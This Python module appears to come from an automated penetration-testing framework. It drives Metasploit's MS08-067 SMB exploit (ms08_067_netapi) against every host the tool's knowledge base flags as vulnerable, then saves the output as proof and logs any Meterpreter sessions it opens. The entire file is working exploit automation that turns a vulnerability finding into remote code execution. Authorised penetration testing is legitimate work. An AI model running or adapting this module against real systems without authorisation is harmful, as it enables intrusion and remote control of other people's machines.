import re

from core.actionModule import actionModule
from core.keystore import KeyStore as kb
from core.mymsf import myMsf
from core.utils import Utils


class msf_ms08_067(actionModule):
    def __init__(self, config, display, lock):
        super(msf_ms08_067, self).__init__(config, display, lock)
        self.title = "Attempt to exploit MS08-067"
        self.shortName = "MSFms08-067"
        self.description = "execute [exploit/windows/smb/ms08_067_netapi] on each target"

        self.requirements = ["msfconsole"]
        self.triggers = ["ms08-067"]
        self.types = ["exploit"]
        
        self.safeLevel = 4

    def getTargets(self):
        # we are interested only in the hosts that had nullsessions
        self.targets = kb.get('host/*/vuln/ms08-067')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        if len(self.targets) > 0:
            # connect to msfrpc
            msf = myMsf(host=self.config['msfhost'], port=self.config['msfport'], user=self.config['msfuser'],
                        password=self.config['msfpass'])

            if not msf.isAuthenticated():
                return

            # loop over each target
            for t in self.targets:
                # verify we have not tested this host before
                if not self.seentarget(t):
                    # add the new IP to the already seen list
                    self.addseentarget(t)
                    self.display.verbose(self.shortName + " - Connecting to " + t)
                    msf.execute("use exploit/windows/smb/ms08_067_netapi\n")
                    msf.execute("set TARGET 0\n")
                    # msf.execute("set PAYLOAD windows/meterpreter/bind_tcp\n")
                    # msf.execute("set LHOST %s\n" % self.config['lhost'])
                    # msf.execute("set LPORT %i\n" % int(Utils.getUnusedPort()))
                    # msf.execute("set LPORT 4444\n")
                    msf.execute("set RPORT 445\n")
                    msf.execute("set RHOST " + t + "\n")
                    msf.execute("set SMBPIPE BROWSER\n")
                    msf.execute("exploit -j\n")
                    msf.sleep(int(self.config['msfexploitdelay']))

                    outfile = self.config["proofsDir"] + self.shortName + "_" + t + "_" + Utils.getRandStr(10)
                    result = msf.getResult()
                    Utils.writeFile(result, outfile)
                    kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"))

                    parts = re.findall(".*Meterpreter session (\d+) opened.*", result)
                    for part in parts:
                        self.fire("msfSession")
                        self.display.verbose("NEW session on : " + t)
                        kb.add("host/" + t + "/msfSession/" + str(part))

            # clean up after ourselves
            result = msf.cleanup()

        return
